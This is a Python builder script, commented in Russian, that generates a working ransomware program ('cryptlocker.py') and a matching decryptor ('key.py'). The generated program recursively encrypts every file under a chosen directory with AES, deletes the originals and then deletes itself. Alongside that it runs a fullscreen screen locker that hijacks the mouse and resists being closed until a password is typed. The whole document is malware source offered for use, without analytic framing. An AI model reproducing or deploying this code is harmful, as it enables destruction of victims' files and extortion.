direct=input("Write the root directory for crypt: ") # Директория с которой начнёт действовать шифрование по методу tree
crypt_pass=input("Write the password for crypter: ")
locker_pass=input("Write the password for locker: ") # Пароли для шифровальщика и локера
with open("cryptlocker.py","w") as crypt: 
	crypt.write('''
import os, sys, pyAesCrypt # Модули для парсинга директорий (os), удаления первоначального файла (sys) и зашифровки файлов (pyAesCrypt)
from threading import * # Модуль для связки программ
from pyautogui import click, moveTo # Модуль pyautogui для затруднения пользования
from tkinter import Tk,Entry,Label # Модуль tkinter для отображения графических окон
from time import sleep # Модуль time для функциональности
def locker(): # Функция создания локера
	def callback(event): # Функция для просмотра условия
		global k,entry # Объявление глобальных переменных
		if entry.get()=="'''+str(locker_pass)+'''": k=True # Если пароль верный, то остановить цикл
	def block(): # Функция отображения локера
		click(675, 420) # Кликать на координаты 675 420
		moveTo(675, 420) # Перемещать курсор на координаты 675 420
		root.attributes("-fullscreen",True) # Окно во весь экран
		root.protocol("WM_DELETE_WINDOW", block) # Если будут задействованы горячие клавиши завершения программы- выполнится заного функция
		root.update() # Обновить отображение локера
		root.bind('<Control-KeyPress-c>', callback) # Если комбинация клавиш Ctrl-C - выполнить функцию callback
	global k,entry # Объявление глобальных переменных
	root = Tk() # Открытие окна локера
	root.title("Locker") # Имя программы
	root.attributes("-fullscreen",True) # Установка окна во весь экран
	entry = Entry(root,font=1) # Объявление поля ввода
	label0=Label(root,text="Locker_by_#571",font=1) # Объявление надписи 
	label0.grid(row=0,column=0) # Установка надписи
	label1=Label(root,text="Write the Password and Press Ctrl+C",font='Arial 20') # Объявление надписи
	label1.place(x=470,y=300) # Устновка надписи
	entry.place(width=150,height=50,x=600,y=400) # Установка поля ввода
	root.update(); sleep(0.2) # Обновить отображение локера и ничего не делать 0.2 секунды
	click(675, 420) # Кликнуть один раз на координаты 675 420
	k=False # Пока k=False - выполнять функцию block
	while k!=True: block() # Пока k=False - выполнять функцию block
def crypter(): # Функция создания шифровальщика
	def crypt(file):# Функция для зашифровки файла
		print("---------------------------------------------------------------")
		password="'''+str(crypt_pass)+'''" # Указываем пароль
		bufferSize = 512*1024 # Указываем размер буфера (чем больше файл, тем больше ставьте размер буфера)
		pyAesCrypt.encryptFile(str(file), str(file)+".crp", password, bufferSize) # Зашифровка файла
		print("[crypted] '"+str(file)+".crp'")
		os.remove(file) # Удаление незашифрованного файла
	def walk(dir): # Функция парсинга директорий 
		for name in os.listdir(dir):  # Парсинг файлов и директорий в указанной директории
			path = os.path.join(dir, name) # Полный путь к файлу или директории
			if os.path.isfile(path): crypt(path) # Если полный путь является файлом - зашифровать
			else: walk(path) # Иначе, если это директория, перейти в неё
	walk("'''+str(direct)+'''") # Указание корневой директории
	print("---------------------------------------------------------------")
	os.remove(str(sys.argv[0])) # Удалить текущий файл-шифровальщик
thread_1 = Thread(target=locker) # Добавление в многопоточность функцию локер
thread_2 = Thread(target=crypter) # Добавление в многопоточность функцию шифровальщик
thread_1.start(); thread_2.start() # Включение многопоточности у обоих функций
thread_1.join(); thread_2.join() # Объединение функций''')
	print("[+] File 'cryptlocker.py' successfully saved!") # Завершение программы
with open("key.py","w") as key: 
	key.write('''
import os, sys # Модули для парсинга директорий (os) и удаления первоначального файла (sys)
def decrypt(file): # Функция для расшифровки файла
	import pyAesCrypt # Модуль для зашифровки / расшифровки файлов
	print("---------------------------------------------------------------")
	password="'''+str(crypt_pass)+'''" # Вводим пароль
	bufferSize = 512*1024 # Указываем размер буфера (чем больше файл, тем больше ставьте размер буфера)
	pyAesCrypt.decryptFile(str(file), str(os.path.splitext(file)[0]), password, bufferSize) # Расшифровка файла
	print("[decrypted] '"+str(os.path.splitext(file)[0])+"'")
	os.remove(file) # Удаление зашифрованного файла
def walk(dir): # Функция парсинга директорий 
	for name in os.listdir(dir): # Парсинг файлов и директорий в указанной директории
		path = os.path.join(dir, name) # Полный путь к файлу или директории
		if os.path.isfile(path): 
			try: decrypt(path) # Если полный путь является файлом - зашифровать
			except: pass # Если файл не зашифрован - пропустить
		else: walk(path) # Иначе, если это директория, перейти в неё
walk("'''+str(direct)+'''") # Указание корневой директории
print("---------------------------------------------------------------")
os.remove(str(sys.argv[0])) # Удалить текущий файл-ключ''')
	print("[+] File 'key.py' successfully saved!") # Завершение программы